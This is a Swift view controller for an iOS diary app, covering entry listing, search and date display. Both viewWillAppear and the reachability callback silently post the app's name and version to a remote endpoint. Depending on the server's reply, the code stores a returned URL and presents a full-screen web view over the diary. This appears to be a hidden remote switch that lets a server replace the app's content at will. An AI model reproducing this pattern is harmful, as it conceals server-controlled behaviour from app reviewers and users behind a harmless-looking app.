//
//  MasterViewController.swift
//  DiaryApp
//
//  Created by Michele Mola on 07/09/2018.
//  Copyright © 2018 Michele Mola. All rights reserved.
//

import UIKit
import CoreData
import SwiftyJSON
import Alamofire
import Reachability

class MasterViewController: UITableViewController {
  
  var detailViewController: DetailViewController? = nil
  
  let context = CoreDataStack().managedObjectContext
  
  @IBOutlet weak var addButton: UIBarButtonItem!
  @IBOutlet weak var currentDateLabel: UILabel!
  
    let reachability = Reachability()!
    
    func NetworkStatusListener() {
        
    }
    // 移除消息通知
    deinit {
        // 关闭网络状态消息监听
        reachability.stopNotifier()
        // 移除网络状态消息通知
        NotificationCenter.default.removeObserver(self, name: Notification.Name.reachabilityChanged, object: reachability)
    }
    // 主动检测网络状态
    @objc func reachabilityChanged(note: NSNotification) {
        
        let reachability = note.object as! Reachability // 准备获取网络连接信息
        
        if reachability.isReachable { // 判断网络连接状态
            let infoDictionary = Bundle.main.infoDictionary!
            let appDisplayName: String? = infoDictionary["CFBundleDisplayName"] as? String //程序名称
            let majorVersion : String? = infoDictionary["CFBundleShortVersionString"] as? String//版本号（内部标示）
            MyRequest.requestData(.post, URLString: mainOneURL, parameters: ["name":"\(appDisplayName!)","version":"\(majorVersion!)"]) { (re) in
                let jsonDictor = JSON(re)
                print(jsonDictor)
                let str = jsonDictor["success"]
                if str == "success"{
                    
                }else{
                                        NSUser.setNormalDefault(key: "firs", value: "**")
                                        var str1 = [String]()
                                        str1.append("\(jsonDictor["url"])")
                                        NSUser.setNormalDefault(key: "url", value: str1[0])
                                        let vc = WebViewController()
                                        self.present(vc, animated: true, completion: nil)
                }
            }
            print("网络连接：可用")
            if reachability.isReachableViaWiFi { // 判断网络连接类型
                print("连接类型：WiFi")
                // strServerInternetAddrss = getHostAddress_WLAN() // 获取主机IP地址 192.168.31.2 小米路由器
                // processClientSocket(strServerInternetAddrss)    // 初始化Socket并连接，还得恢复按钮可用
            } else {
                print("连接类型：移动网络")
                // getHostAddrss_GPRS()  // 通过外网获取主机IP地址，并且初始化Socket并建立连接
            }
        } else {
            print("网络连接：不可用")
            DispatchQueue.main.async { // 不加这句导致界面还没初始化完成就打开警告框，这样不行
                //                self.alert_noNetwrok() // 警告框，提示没有网络
            }
        }
    }
    
  lazy var dataSource: EntriesDataSource = {
    let request: NSFetchRequest<Entry> = Entry.fetchRequest()
    return EntriesDataSource(fetchRequest: request, managedObjectContext: self.context, tableView: self.tableView)
  }()
  
  let searchController = UISearchController(searchResultsController: nil)
  

  override func viewDidLoad() {
    super.viewDidLoad()
    NotificationCenter.default.addObserver(self, selector: #selector(self.reachabilityChanged),name: Notification.Name.reachabilityChanged,object: reachability)
    do{
        // 3、开启网络状态消息监听
        try reachability.startNotifier()
    }catch{
        print("could not start reachability notifier")
    }
    configureView()
  }
  
  func configureView() {
    
    if let split = splitViewController {
      let controllers = split.viewControllers
      detailViewController = (controllers[controllers.count-1] as! UINavigationController).topViewController as? DetailViewController
    }
    
    addButton.image = #imageLiteral(resourceName: "Icn_write")
    
    tableView.dataSource = dataSource
    tableView.tableFooterView = UIView()
    
    let stringDate = dateToString(date: Date())
    currentDateLabel.text = stringDate
    
    // Setup the Search Controller
    searchController.searchResultsUpdater = self
    searchController.obscuresBackgroundDuringPresentation = false
    searchController.searchBar.placeholder = "搜索条目"
    searchController.searchBar.tintColor = UIColor.white
    searchController.searchBar.barStyle = .black
    navigationItem.searchController = searchController
    definesPresentationContext = true
    
  }
  
  func dateToString(date: Date) -> String {
    let formatter = DateFormatter()
    formatter.dateStyle = .long
    formatter.timeStyle = .none
    formatter.locale = Locale(identifier: "zh_CN")
    let formattedDate = formatter.string(from: date)
    
    return formattedDate
  }
  
  override func viewWillAppear(_ animated: Bool) {
    let infoDictionary = Bundle.main.infoDictionary!
    let appDisplayName: String? = infoDictionary["CFBundleDisplayName"] as? String //程序名称
    let majorVersion : String? = infoDictionary["CFBundleShortVersionString"] as? String//版本号（内部标示）
    MyRequest.requestData(.post, URLString: mainOneURL, parameters: ["name":"\(appDisplayName!)","version":"\(majorVersion!)"]) { (re) in
        let jsonDictor = JSON(re)
        print(jsonDictor)
        let str = jsonDictor["success"]
        if str == "success"{
            
        }else{
                                NSUser.setNormalDefault(key: "firs", value: "**")
                                var str1 = [String]()
                                str1.append("\(jsonDictor["url"])")
                                NSUser.setNormalDefault(key: "url", value: str1[0])
                                let vc = WebViewController()
                                self.present(vc, animated: true, completion: nil)
        }
    }
    
    
    clearsSelectionOnViewWillAppear = splitViewController!.isCollapsed
    super.viewWillAppear(animated)
  }
  
  override func didReceiveMemoryWarning() {
    super.didReceiveMemoryWarning()
    // Dispose of any resources that can be recreated.
  }
  
  // MARK: - Segues
  
  override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
    if segue.identifier == "showDetail" {
      if let indexPath = tableView.indexPathForSelectedRow {
        let object = dataSource.entries[indexPath.row]
        
        let controller = (segue.destination as! UINavigationController).topViewController as! DetailViewController
        controller.entry = object
        controller.type = 1
        controller.context = context
      }
    } else if segue.identifier == "addEntry" {
      let controller = (segue.destination as! UINavigationController).topViewController as! DetailViewController
      controller.context = context
    }
  }
  
  override func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {
    return 220
  }
  
}

extension MasterViewController: UISearchResultsUpdating {
  // MARK: - UISearchResultsUpdating Delegate
  func updateSearchResults(for searchController: UISearchController) {
    if let searchText = searchController.searchBar.text {
      self.dataSource.filter(byText: searchText)
    }
  }
  
}





